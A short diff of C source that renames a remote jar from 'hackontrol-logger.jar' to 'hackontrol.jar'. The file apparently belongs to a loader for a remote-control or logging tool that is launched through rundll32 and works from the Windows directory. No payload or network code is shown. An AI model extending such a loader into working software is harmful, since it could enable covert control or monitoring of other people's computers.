@@ -12,7 +12,7 @@
 #define RUNDLL32EXE      L"rundll32.exe"
 #define LIBRARY_NAME     L"libdll32.dll"
 #define JAVA_PATH_NAME    "jn" // Java runtime eNvironment
-#define REMOTE_FILE_NAME L"hackontrol-logger.jar"
+#define REMOTE_FILE_NAME L"hackontrol.jar"
 
 __declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LPSTR argument, int command) {
 	LPWSTR windowsDirectoryPath = KHGetWindowsDirectoryW();
